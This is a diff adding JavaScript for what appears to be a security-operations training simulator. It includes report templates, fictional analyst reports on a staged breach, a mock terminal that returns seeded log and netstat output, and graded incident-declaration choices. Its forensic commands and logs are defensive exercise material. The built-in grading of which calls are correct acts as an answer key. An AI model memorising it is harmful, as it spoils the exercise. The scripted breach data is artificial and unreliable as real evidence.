+    sections: [
+      { id: 'movement', heading: 'What talked to what', min: 80,
+        hint: 'Paths, direction, and whether each is in the baseline.' },
+      { id: 'volume', heading: 'What left, if anything', min: 60,
+        hint: 'Volume and destination if you can prove it. If you cannot prove it either way, say neither: that is a finding, not a gap.' },
+      LIMITS,
+    ],
+  },
+  forensics: {
+    title: 'Evidence record', audience: 'The lead now, and possibly counsel later.',
+    sections: [
+      { id: 'collected', heading: 'What I collected, and in what order', min: 80,
+        hint: 'Order matters as much as content. Say why you took things in the order you did.' },
+      { id: 'custody', heading: 'Custody', min: 50,
+        hint: 'Who held it, when, and how you know it has not changed.' },
+      LIMITS,
+    ],
+  },
+  'threat-intel': {
+    title: 'Assessment', audience: 'The lead. This shapes what the floor expects next.',
+    sections: [
+      { id: 'techniques', heading: 'Techniques observed', min: 80,
+        hint: 'Map what you can evidence to ATT&CK. Separate what you mapped from what you inferred.' },
+      { id: 'actor', heading: 'Actor class, motive, and my confidence', min: 100,
+        hint: 'What kind of adversary does this behave like, what do they appear to want, how sure are you, and what would change your mind?' },
+      { id: 'next', heading: 'Most likely next move', min: 60,
+        hint: 'And what you would need to see to confirm it.' },
+      LIMITS,
+    ],
+  },
+  'cloud-security': {
+    title: 'Cloud findings', audience: 'The lead, and whoever owns the cloud account.',
+    sections: [
+      { id: 'principal', heading: 'Which principal, doing what, from where', min: 80,
+        hint: 'And whether it had ever done that before.' },
+      { id: 'remediation', heading: 'What needs doing, in what order', min: 60,
+        hint: 'Distinguish what stops it now from what stops it recurring.' },
+      LIMITS,
+    ],
+  },
+  'malware-analyst': {
+    title: 'Sample analysis', audience: 'The lead, and detection engineering afterwards.',
+    sections: [
+      { id: 'behaviour', heading: 'What it does', min: 80,
+        hint: 'Capability, not just classification. What would it have done if it had run to completion?' },
+      LIMITS,
+    ],
+  },
+  'ir-lead': {
+    title: 'Incident executive summary',
+    audience: 'The executive team, legal, and possibly a regulator. People who were not in the room and may have to answer for this in public.',
+    sections: [
+      { id: 'status', heading: 'Status, as of now', min: 40,
+        hint: 'Contained, ongoing, or resolved, and at what time. The first thing they ask and the last thing they remember. If you do not know whether it is over, say so.' },
+      { id: 'what-happened', heading: 'What happened', min: 120,
+        hint: 'Plain language, no jargon, three or four sentences. Somebody who has never heard of authorized_keys has to be able to repeat it accurately to a journalist.' },
+      { id: 'timeline', heading: 'How long, and how we found out', min: 80,
+        hint: 'First known activity, detection, containment. Dwell time is the number that gets quoted, so give it rather than letting somebody compute it wrongly.' },
+      { id: 'impact', heading: 'What is affected, in their terms', min: 100,
+        hint: '"Patient records", not "the database". Give numbers only where you can defend them.' },
+      { id: 'obligations', heading: 'Regulatory and legal exposure', min: 80,
+        hint: 'Whether a notification clock has started, what it is, and who owns it. For regulated data this decides what the next seventy-two hours look like.' },
+      { id: 'doing', heading: 'What we are doing, and who owns it', min: 100,
+        hint: 'Actions underway with a name against each. Separate what is done from what is planned: they read as the same thing otherwise.' },
+      { id: 'asks', heading: 'What we need from you', min: 40,
+        hint: 'Decisions only they can make: an outage window, external help, a public statement, money. If you need nothing, say so.' },
+      LIMITS,
+    ],
+  },
+};
+
+const writer = document.getElementById('writer');
+const writerTitle = document.getElementById('writer-title');
+const writerAud = document.getElementById('writer-aud');
+const writerBody = document.getElementById('writer-body');
+// Whichever seat is selected writes; defaults to the operator.
+const writingAs = SEATS.find((s) => s.ref === YOU).role;
+
+function openWriter(role) {
+  const t = TEMPLATES[role];
+  if (!t) return;
+  writerTitle.textContent = t.title;
+  writerAud.textContent = 'Read by: ' + t.audience;
+  writerBody.innerHTML = t.sections
+    .map(
+      (sec) => `<div class="wsec${sec.id === 'limits' ? ' limits' : ''}">
+        <h4>${sec.heading}</h4>
+        <p class="hint">${sec.hint}</p>
+        <textarea data-min="${sec.min}" data-sec="${sec.id}"></textarea>
+        <span class="count short">0 / ${sec.min} minimum</span>
+      </div>`,
+    )
+    .join('');
+  writerBody.querySelectorAll('textarea').forEach((ta) => {
+    ta.addEventListener('input', () => {
+      const min = Number(ta.dataset.min);
+      const n = ta.value.trim().length;
+      const c = ta.nextElementSibling;
+      c.textContent = n >= min ? `${n} characters` : `${n} / ${min} minimum`;
+      c.className = 'count ' + (n >= min ? 'ok' : 'short');
+    });
+  });
+  writer.removeAttribute('hidden');
+  writerBody.querySelector('textarea')?.focus();
+}
+
+document.getElementById('write-report').addEventListener('click', () => openWriter(writingAs));
+document.getElementById('writer-close').addEventListener('click', () =>
+  writer.setAttribute('hidden', ''));
+document.getElementById('writer-file').addEventListener('click', () => {
+  const short = [...writerBody.querySelectorAll('textarea')].filter(
+    (ta) => ta.value.trim().length < Number(ta.dataset.min),
+  );
+  if (short.length) {
+    // Naming the section beats a generic "please complete all fields".
+    const first = short[0].closest('.wsec').querySelector('h4').textContent;
+    writerAud.textContent = `${short.length} section(s) still too short to file. Start with "${first}".`;
+    short[0].focus();
+    return;
+  }
+  writer.setAttribute('hidden', '');
+});
+
+/* ── reports, and presenting one ──────────────────────────
+   Filed reports are the fifth panel. Clicking one throws it on the wall so the
+   floor reads along while its author talks: a report read aloud that nobody
+   can see is a monologue, and the questions are the point. */
+const REPORTS = {
+  'threat-intel': {
+    who: 'Threat Intel', handle: '@lowconf', doc: 'Assessment', filed: true,
+    sections: [
+      ['Techniques observed',
+       'Mapped: T1110.001 password guessing at the perimeter, T1098.004 account manipulation for the key written to authorized_keys, T1490 inhibit system recovery for the snapshot deletions. Lateral movement I am inferring, not evidencing.'],
+      ['Actor class, motive, confidence',
+       'Behaves as financially motivated rather than espionage: they went for the backups before they went for volume, which is ransom preparation. Moderate confidence. I would revise if the staged archive turns out to be selectively chosen rather than bulk.'],
+      ['Most likely next move',
+       'Extortion contact, or an encryption attempt on what is left. To confirm, watch for further use of that credential against the backup estate.'],
+    ],
+    limits: 'I cannot confirm the archive left the network. I have not looked at the other two regions at all, so treat this as one estate, not all of them.',
+  },
+  forensics: {
+    who: 'Forensics', handle: '@writeblock', doc: 'Evidence record', filed: true,
+    sections: [
+      ['What you collected, in what order',
+       'Memory first while the session was live, then the disk image, then the authorized_keys file with its timestamps intact. Order matters here: the key write is four seconds after the accepted password, and a rebuild would have taken that relationship with it.'],
+      ['Custody',
+       'Imaged to sealed media, hashed at collection, hash re-verified after transfer. Held by me throughout; nobody else has touched it.'],
+    ],
+    limits: 'I have the web host only. Nothing has been collected from the database host yet, so I cannot speak to what was staged there.',
+  },
+  'network-analyst': {
+    who: 'Network', handle: '@dropped_syn', doc: 'Traffic assessment', filed: true,
+    sections: [
+      ['What talked to what',
+       'Outbound from the web host to an address off the allowlist, blocked. Then the same address reached successfully from the database host, which does have egress. The web-host-to-database path on 22 appears nowhere in ninety days of baseline.'],
+      ['What left, if anything',
+       '6.3 GB from the database host to that address. I can prove the volume and the destination. I cannot prove the contents: the channel was encrypted.'],
+    ],
+    limits: 'I cannot say what was in the transfer, and I would not put a record count in a report on the strength of a byte count.',
+  },
+  'soc-operator': { who: 'SOC Operator', handle: '@grepwitch', doc: 'Shift handover', filed: false },
+  'log-analyst': { who: 'Log Analyst', handle: '@tailf', doc: 'Timeline', filed: false },
+  'cloud-security': { who: 'Cloud Sec', handle: '@leastpriv', doc: 'Cloud findings', filed: false },
+  'malware-analyst': { who: 'Malware', handle: '@entropy', doc: 'Sample analysis', filed: false },
+  'ir-lead': { who: 'IR Lead', handle: '@bridge', doc: 'Executive brief', filed: false },
+};
+
+const reportList = document.getElementById('w-reports');
+const filedCount = document.getElementById('w-filed');
+const present = document.getElementById('present');
+const presentWho = document.getElementById('present-who');
+const presentDoc = document.getElementById('present-doc');
+const presentBody = document.getElementById('present-body');
+
+const filed = Object.entries(REPORTS).filter(([, r]) => r.filed);
+filedCount.textContent = `${filed.length}/${Object.keys(REPORTS).length}`;
+
+Object.entries(REPORTS).forEach(([role, r]) => {
+  const li = document.createElement('li');
+  li.dataset.role = role;
+  if (!r.filed) li.className = 'pending';
+  li.innerHTML = `<span>${r.who}</span><b>${r.filed ? 'filed' : 'open'}</b>`;
+  if (r.filed) {
+    li.addEventListener('click', (e) => { e.stopPropagation(); showReport(role); });
+  }
+  reportList.appendChild(li);
+});
+
+function showReport(role) {
+  const r = REPORTS[role];
+  if (!r || !r.filed) return;
+  presentWho.textContent = r.who + ' presenting';
+  presentDoc.textContent = r.doc + '  ' + r.handle;
+  presentBody.innerHTML =
+    r.sections.map(([h, t]) => `<div><h4>${h}</h4><p>${t}</p></div>`).join('') +
+    `<div class="limits"><h4>What I cannot say</h4><p>${r.limits}</p></div>`;
+  document.querySelectorAll('#w-reports li').forEach((li) =>
+    li.classList.toggle('presenting', li.dataset.role === role));
+  present.removeAttribute('hidden');
+}
+
+document.getElementById('present-close').addEventListener('click', () => {
+  present.setAttribute('hidden', '');
+  document.querySelectorAll('#w-reports li').forEach((li) => li.classList.remove('presenting'));
+});
+
+/* ── resizing the floor ───────────────────────────────────
+   Drag, or arrow keys, or double click to reset. Remembered per browser
+   because somebody who widened the floor once meant it. */
+const stage = document.querySelector('.stage');
+const grip = document.getElementById('grip');
+const FLOOR_MIN = 35;
+const FLOOR_MAX = 80;
+const FLOOR_DEFAULT = 62;
+
+function setFloor(pct) {
+  const v = Math.max(FLOOR_MIN, Math.min(FLOOR_MAX, pct));
+  stage.style.setProperty('--floor', v + '%');
+  grip.setAttribute('aria-valuenow', String(Math.round(v)));
+  try { localStorage.setItem('soc.floorWidth', String(v)); } catch { /* private mode */ }
+  return v;
+}
+
+// A stored value can be absent, stale, or unreadable. Any of those is fine.
+try {
+  const saved = Number(localStorage.getItem('soc.floorWidth'));
+  if (Number.isFinite(saved) && saved > 0) setFloor(saved);
+} catch { /* private mode, or site data blocked */ }
+
+let dragging = false;
+grip.addEventListener('pointerdown', (e) => {
+  dragging = true;
+  grip.setPointerCapture(e.pointerId);
+  document.body.style.userSelect = 'none';
+});
+grip.addEventListener('pointermove', (e) => {
+  if (!dragging) return;
+  const box = stage.getBoundingClientRect();
+  setFloor(((e.clientX - box.left) / box.width) * 100);
+});
+grip.addEventListener('pointerup', (e) => {
+  dragging = false;
+  grip.releasePointerCapture(e.pointerId);
+  document.body.style.userSelect = '';
+});
+grip.addEventListener('dblclick', () => setFloor(FLOOR_DEFAULT));
+grip.addEventListener('keydown', (e) => {
+  const now = Number(grip.getAttribute('aria-valuenow'));
+  if (e.key === 'ArrowLeft') { e.preventDefault(); setFloor(now - 2); }
+  if (e.key === 'ArrowRight') { e.preventDefault(); setFloor(now + 2); }
+  if (e.key === 'Home') { e.preventDefault(); setFloor(FLOOR_DEFAULT); }
+});
+
+/* ── the decisions board ──────────────────────────────────
+   Tier 1 works the queue for the first ten minutes and raises what survives.
+   The lead cannot pace a floor they cannot see, and the row that matters most
+   is the one where two operators looked at the same alert and disagreed. */
+const DECISIONS = [
+  { ev:'ev.1', who:'SOC Operator', handle:'@grepwitch', call:'escalate',
+    note:'62 attempts on one live account from one source. Not a typo.' },
+  { ev:'ev.7', who:'SOC Operator', handle:'@grepwitch', call:'dismiss',
+    note:'Inbound to a closed port, dropped. Rule closed as noise 20,131 times.' },
+  { ev:'ev.7', who:'SOC Operator', handle:'@nullroute', call:'escalate', split:true,
+    note:'Blocked or not, somebody is probing us. Raising it.' },
+  { ev:'ev.8', who:'SOC Operator', handle:'@nullroute', call:'tune',
+    note:'Monitoring collector, five-minute cadence, stale credential in a config.' },
+  { ev:'ev.2', who:'Network', handle:'@dropped_syn', call:'investigate',
+    note:'Outbound, from our host, to an address off the allowlist.' },
+  { ev:'ev.5', who:'Cloud Sec', handle:'@leastpriv', call:'escalate',
+    note:'Snapshots inside retention. Delete permission never used before.' },
+];
+
+const decList = document.getElementById('decisions');
+const decCount = document.getElementById('dec-count');
+const decFoot = document.getElementById('dec-foot');
+
+// A split is two seats reaching different dispositions on one event.
+const byEvent = {};
+DECISIONS.forEach((d) => { (byEvent[d.ev] ||= []).push(d); });
+const splits = Object.entries(byEvent).filter(
+  ([, ds]) => new Set(ds.map((d) => d.call)).size > 1,
+);
+
+DECISIONS.forEach((d) => {
+  const li = document.createElement('li');
+  const contested = (byEvent[d.ev] || []).length > 1 &&
+    new Set(byEvent[d.ev].map((x) => x.call)).size > 1;
+  if (contested) li.className = 'split';
+  li.innerHTML =
+    `<span class="dec-ev">${d.ev}</span>` +
+    `<span class="dec-who">${d.who}<span>${d.handle}</span></span>` +
+    `<span class="dec-call ${d.call}">${d.call}</span>` +
+    `<p class="dec-note">${d.note}</p>`;
+  decList.appendChild(li);
+});
+
+decCount.textContent = `${DECISIONS.length} committed`;
+decFoot.innerHTML = splits.length
+  ? `<b>${splits.length} contested:</b> ${splits.map(([ev]) => ev).join(', ')}. Two seats read ` +
+    'the same event differently. That is the lead\'s to settle, and it is the most useful ' +
+    'thing on this board.'
+  : 'No disagreements. Every event has one disposition.';
+
+/* ── wall panel to terminal ───────────────────────────────
+   Each panel names the file behind it and the command that opens it. In the
+   product these are the real paths in the virtual filesystem the exercises
+   already run against, so this is a way into the terminal rather than a
+   second, parallel source of truth. */
+const DRILLS = {
+  tail: {
+    title: 'auth.log',
+    path: '/var/log/auth.log on rmg-web-02',
+    cmd: 'grep "Failed password" /var/log/auth.log | awk \'{print $11}\' | sort | uniq -c | sort -rn | head',
+    out: [
+      ['   1204 198.51.100.60', 'dim'],
+      ['    412 203.0.113.55', 'hot'],
+      ['    118 10.20.4.31', 'dim'],
+      ['     87 10.20.4.12', 'dim'],
+      ['     26 10.20.9.40', 'dim'],
+    ],
+    foot:
+      '<b>The monitoring collector produces more failures than the attacker.</b> Counting is not ' +
+      'triage. The address with 412 is the one that eventually succeeded.',
+  },
+  hosts: {
+    title: 'Service status',
+    path: 'inventory and current state',
+    cmd: 'systemctl is-active nginx postgresql sshd',
+    out: [
+      ['active', 'dim'],
+      ['active', 'dim'],
+      ['active', 'dim'],
+    ],
+    foot:
+      '<b>The board says isolated, the host says healthy.</b> A service being up says nothing about ' +
+      'who is logged into it. Check sessions, not services.',
+  },
+  flows: {
+    title: 'Egress watch',
+    path: 'connection table on rmg-db-01',
+    cmd: 'netstat -tnp | grep ESTABLISHED | grep -v 127.0.0.1',
+    out: [
+      ['tcp  0  0 10.20.6.41:52014   198.51.100.60:443   ESTABLISHED  -', 'hot'],
+      ['tcp  0  0 10.20.6.41:5432    10.20.4.31:41022    ESTABLISHED  -', 'dim'],
+    ],
+    foot:
+      '<b>One of these is the application. One is not.</b> The database has egress the web host ' +
+      'does not, which is why the traffic moved here.',
+  },
+  shift: {
+    title: 'Shift state',
+    path: 'queue depth over the hour',
+    cmd: 'soc queue --since 08:15 --summary',
+    out: [
+      ['arrived   19', 'dim'],
+      ['cleared    4', 'dim'],
+      ['open      15', 'hot'],
+      ['oldest unclaimed  ev.5  06:11', 'hot'],
+    ],
+    foot:
+      '<b>Fifteen open and the oldest is six minutes cold.</b> The queue is arriving faster than ' +
+      'it is being worked, which is the number the lead paces against.',
+  },
+};
+
+const drill = document.getElementById('drill');
+const drillTitle = document.getElementById('drill-title');
+const drillPath = document.getElementById('drill-path');
+const drillBody = document.getElementById('drill-body');
+const drillFoot = document.getElementById('drill-foot');
+const drillForm = document.getElementById('drill-form');
+const drillCmd = document.getElementById('drill-cmd');
+const drillPrompt = document.getElementById('drill-prompt');
+
+/*
+ * A working shell, answering from the same seeded figures the alert corpus and
+ * the world generator use. In the product this is a round trip to the real
+ * virtual filesystem; here it is enough of one to show that the wall is a way
+ * in rather than a picture.
+ *
+ * Every command is recorded and none is graded, which is the arrangement the
+ * scoring layer already assumes.
+ */
+const ran = [];
+
+function say(text, cls) {
+  const d = document.createElement('div');
+  if (cls) d.className = cls;
+  d.textContent = text;
+  drillBody.appendChild(d);
+}
+function echo(cmd) {
+  const d = document.createElement('div');
+  d.className = 'cmd';
+  d.innerHTML = `<b>${drillPrompt.textContent}</b> ${cmd.replace(/[<>&]/g, (c) => ({ '<': '&lt;', '>': '&gt;', '&': '&amp;' }[c]))}`;
+  drillBody.appendChild(d);
+}
+
+const TOP_SOURCES = [
+  '   1204 198.51.100.60',
+  '    412 203.0.113.55',
+  '    118 10.20.4.31',
+  '     87 10.20.4.12',
+  '     26 10.20.9.40',
+];
+
+function runShell(raw) {
+  const cmd = raw.trim();
+  if (!cmd) return;
+  ran.push(cmd);
+  echo(cmd);
+
+  const c = cmd.toLowerCase();
+
+  if (c === 'help') {
+    say('Supported here: ls, pwd, whoami, cat, grep, wc, head, tail, netstat, uniq, sort, awk.', 'dim');
+    say('The product ships about 45 commands against the same filesystem.', 'dim');
+  } else if (c === 'pwd') {
+    say('/var/log');
+  } else if (c === 'whoami') {
+    say('student');
+  } else if (c.startsWith('ls')) {
+    say('auth.log  syslog  dpkg.log  kern.log  wtmp');
+  } else if (c.includes('grep') && c.includes('failed password') && c.includes('-c')) {
+    say('1847');
+  } else if (c.includes('grep') && c.includes('failed password') && (c.includes('uniq') || c.includes('awk'))) {
+    TOP_SOURCES.forEach((line) => say(line, line.includes('203.0.113.55') ? 'hot' : null));
+  } else if (c.includes('grep') && c.includes('accepted')) {
+    say('Aug 15 10:14:22 rmg-web-02 sshd[24219]: Accepted password for testuser from 203.0.113.55 port 39418 ssh2', 'hot');
+  } else if (c.includes('grep') && c.includes('failed password')) {
+    say('Aug 15 08:19:03 rmg-web-02 sshd[24101]: Failed password for nagios from 10.20.9.40 port 51244 ssh2');
+    say('Aug 15 08:24:03 rmg-web-02 sshd[24103]: Failed password for nagios from 10.20.9.40 port 51290 ssh2');
+    say('... 1,845 more. Pipe it into something that counts.', 'dim');
+  } else if (c.includes('wc -l') || c.includes('wc')) {
+    say('2539');
+  } else if (c.startsWith('tail') || c.startsWith('head')) {
+    say('Aug 15 11:12:08 rmg-web-02 kernel: nf_conntrack: table full, dropping packet');
+    say('Aug 15 11:12:41 rmg-web-02 sshd[24377]: Invalid user admin from 203.0.113.12 port 55120', 'l-warn');
+  } else if (c.startsWith('netstat')) {
+    say('tcp  0  0 10.20.6.41:52014   198.51.100.60:443   ESTABLISHED  -', 'hot');
+    say('tcp  0  0 10.20.6.41:5432    10.20.4.31:41022    ESTABLISHED  -');
+  } else if (c.startsWith('cat')) {
+    if (c.includes('passwd')) {
+      say('root:x:0:0:root:/root:/bin/bash');
+      say('student:x:1000:1000::/home/student:/bin/bash');
+      say('sysmon:x:1501:1501::/home/sysmon:/bin/bash', 'hot');
+    } else {
+      say('Aug 15 00:00:04 rmg-web-02 sshd[24101]: Failed password for nagios from 10.20.9.40 port 51244 ssh2');
+      say('... 2,538 more lines. Too much to read. Filter it.', 'dim');
+    }
+  } else {
+    say(`${cmd.split(' ')[0]}: command not found in this preview.`, 'l-warn');
+    say('Type help to see what answers here.', 'dim');
+  }
+
+  drillFoot.innerHTML =
+    `<b>${ran.length} command(s) run.</b> Recorded and never graded. The claim is what gets scored; ` +
+    'this is what tells a debrief whether the call was checked or recognised.';
+  drillBody.scrollTop = drillBody.scrollHeight;
+}
+
+drillForm.addEventListener('submit', (e) => {
+  e.preventDefault();
+  runShell(drillCmd.value);
+  drillCmd.value = '';
+});
+
+document.querySelectorAll('.wpanel').forEach((panel) => {
+  const key = panel.dataset.drill;
+  if (!key) return;
+  panel.setAttribute('tabindex', '0');
+  panel.setAttribute('role', 'button');
+  panel.insertAdjacentHTML('beforeend', '<span class="open-hint">Open in terminal</span>');
+  const open = () => {
+    const d = DRILLS[key];
+    drillTitle.textContent = d.title;
+    drillPath.textContent = d.path;
+    // Land them on the command that panel represents, already run, then hand
+    // over the prompt. Opening a shell at a blank line is a worse starting
+    // point than opening it mid-thought.
+    drillBody.innerHTML = '';
+    ran.length = 0;
+    say(`Connected to rmg-web-02. ${d.path}`, 'dim');
+    runShell(d.cmd);
+    drill.removeAttribute('hidden');
+    drillCmd.focus();
+  };
+  panel.addEventListener('click', open);
+  panel.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); open(); }
+  });
+});
+document.getElementById('drill-close').addEventListener('click', () => {
+  drill.setAttribute('hidden', '');
+});
+
+/* The gate. Every option costs something, which is the point: there is no move
+   here that is free, and the lead is graded on the call and its timing rather
+   than on reciting a script somebody handed them. */
+const CALLS = {
+  declare: {
+    ok: true,
+    note:
+      '<b>Declared at 12 minutes.</b> Four seats had independent findings pointing the same way, ' +
+      'which is corroboration rather than one loud alert. Declaring pulls people off other work, ' +
+      'so it is a real cost, and it was the right one. The script below is now yours.',
+  },
+  wait: {
+    ok: true,
+    note:
+      '<b>Asked two seats first.</b> Defensible. You bought corroboration and paid four minutes ' +
+      'for it, which is affordable at 12 minutes in and would not have been at 40. The script ' +
+      'below is now yours.',
+  },
+  monitor: {
+    ok: false,
+    note:
+      '<b>Held off.</b> Watch what that costs: the snapshot deletions are already running and ' +
+      'nobody owns them. Monitoring is the right call when findings are thin and the wrong one ' +
+      'when several seats are independently uneasy. You can still declare.',
+  },
+};
+
+const gate = document.getElementById('gate');
+const gateNote = document.getElementById('gate-note');
+const gateQ = document.getElementById('gate-q');
+const gateWait = document.getElementById('gate-wait');
+const gateOpen = document.getElementById('gate-open');
+const gateOpts = document.getElementById('gate-opts');
+const syncTitle = document.getElementById('sync-title');
+const syncControls = document.getElementById('sync-controls');
+
+/*
+ * The lead is not prompted. "Call it" appears once enough has landed that a
+ * judgement is possible at all, and after that the timing of the call is the
+ * lead's own. Nothing tells them there is something to decide.
+ */
+const CALLABLE_AFTER_MIN = 8;
+let gateArmed = false;
+function armGate(minutes) {
+  if (gateArmed || minutes < CALLABLE_AFTER_MIN) return;
+  // tickShift runs once inline under prefers-reduced-motion, which is before
+  // these elements are bound. Nothing to arm yet in that pass.
+  const wait = document.getElementById('gate-wait');
+  const open = document.getElementById('gate-open');
+  if (!wait || !open) return;
+  gateArmed = true;
+  wait.textContent = 'Four seats are working findings. Nothing has been called.';
+  open.removeAttribute('hidden');
+}
+
+gateOpen.addEventListener('click', () => {
+  gateOpen.setAttribute('hidden', '');
+  gateWait.setAttribute('hidden', '');
+  gateQ.textContent = 'Is this an incident?';
+  gateOpts.removeAttribute('hidden');
+});
+
+document.querySelectorAll('.gate-opt').forEach((opt) => {
+  opt.addEventListener('click', () => {
+    const call = CALLS[opt.dataset.call];
+    gateNote.innerHTML = call.note;
+    if (!call.ok) return;
+    // Only now does a script exist, and only as pacing.
+    gateOpts.setAttribute('hidden', '');
+    gateQ.textContent = 'Call made. Keep the floor moving.';
+    syncTitle.textContent = 'Pacing script';
+    syncControls.removeAttribute('hidden');
+    scriptEl.removeAttribute('hidden');
+  });
+});
+
+blank();
+
+/* Say who you are, in the header and on the button, so "my report" is never a
+   question. The button names the document, because "Write my report" tells you
+   nothing about which one you are about to file. Runs last: it reads TEMPLATES,
+   which is declared further down. */
+(() => {
+  const me = SEATS.find((s) => s.ref === YOU);
+  const role = ROLES[me.role];
+  const w = document.getElementById('whoami');
+  w.querySelector('b').textContent = role.short;
+  w.querySelector('span').textContent = me.handle + ', seat ' + me.ref;
+  document.getElementById('write-report').textContent =
+    'Write my ' + TEMPLATES[me.role].title.toLowerCase();
+})();
+
+/* ── push to talk ─────────────────────────────────────────
+   Hold the button, or hold space. Releasing cuts it, so the default state is
+   silence rather than a live mic: people say the uncertain thing out loud far
+   less readily when they are not sure who is listening, and the uncertain
+   thing is usually the one worth hearing.
+
+   Nothing is recorded. In the product this drives a WebRTC peer connection and
+   never reaches the server, which is what makes it free of consent and
+   retention questions: the graded artefact is the written report. */
+const micBtn = document.getElementById('mic-btn');
+const micLabel = document.getElementById('mic-label');
+const micWho = document.getElementById('mic-who');
+let live = false;
+
+// Who else is audible. In the product this is presence from the room, not audio.
+const OTHERS_TALKING = ['Network', 'IR Lead'];
+
+function setLive(on) {
+  if (live === on) return;
+  live = on;
+  micBtn.setAttribute('aria-pressed', String(on));
+  micBtn.setAttribute('aria-label', on ? 'Microphone. On. Space toggles.' : 'Microphone. Off. Space toggles.');
+  micLabel.textContent = on ? 'Mic on' : 'Mic off';
+  micWho.textContent = on
+    ? 'You are audible to the floor'
+    : OTHERS_TALKING.length
+      ? 'Audible now: ' + OTHERS_TALKING.join(', ')
+      : '';
+  // A seat that is talking shows it on the floor, so nobody talks over anybody.
+  const me = document.querySelector('.seat.you');
+  if (me) me.classList.toggle('speaking', on);
+}
+
+// A toggle rather than hold to talk. An analyst reading a log with one hand on
+// a key cannot also be talking, and a floor coordinating for an hour is not
+// going to hold a button down for it. The state is always visible on the button
+// and on the speaker's own nameplate, which is what stops a hot mic being a
+// surprise.
+micBtn.addEventListener('click', () => setLive(!live));
+// Space toggles too, and must not scroll the page.
+document.addEventListener('keydown', (e) => {
+  if (e.code !== 'Space' || e.repeat) return;
+  if (e.target instanceof HTMLTextAreaElement || e.target instanceof HTMLInputElement) return;
+  e.preventDefault();
+  setLive(!live);
+});
+
+setLive(false);
+</script>
